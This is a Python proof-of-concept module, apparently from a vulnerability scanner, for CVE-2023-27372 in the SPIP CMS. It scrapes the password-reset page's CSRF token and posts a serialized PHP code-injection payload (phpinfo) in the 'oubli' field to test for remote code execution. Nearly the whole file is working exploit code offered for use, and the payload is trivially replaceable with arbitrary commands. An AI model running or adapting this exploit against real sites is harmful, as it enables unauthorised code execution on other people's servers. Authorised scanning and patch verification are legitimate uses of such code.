'''
Function:
    CVE-2023-27372 RCE漏洞
Author:
    spmonkey，夜梓月
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import os
import sys
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()
path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(path)
from modules import get_user_agent


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': get_user_agent.get_user_agent(),
            'Cookie': 'cibcInit=oui'
        }
        self.value_list = []
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, netloc, scheme):
        try:
            url = "{}://{}/spip.php?page=spip_pass".format(scheme, netloc)
            result_csrf = requests.get(url=url, headers=self.headers, verify=False, proxies=self.proxies)
            if result_csrf.status_code != 200:
                url = "{}://{}/spip/spip.php?page=spip_pass".format(scheme, netloc)
                result_csrf = requests.get(url=url, headers=self.headers, verify=False, proxies=self.proxies)
            bs = BeautifulSoup(result_csrf.text, "lxml")
            csrf = bs.find('input', {'name': 'formulaire_action_args'})
            data = {
                "page": "spip_pass",
                "formulaire_action": "oubli",
                "formulaire_action_args": csrf['value'],
                "oubli": "s:19:\"<?php phpinfo(); ?>\";",
                "nobot": ""
            }
            result = requests.post(url=url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            if "Erreur" in result.text:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意命令执行漏洞 (CVE-2023-27372)\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path+"?"+target.query, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                for param, value in data.items():
                    values = param+"="+value
                    self.value_list.append(values)
                self.result_text += "\n\n                 {}".format("&".join(self.value_list))
                return True
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        if self.vuln(netloc, scheme):
            return self.result_text
        else:
            return False
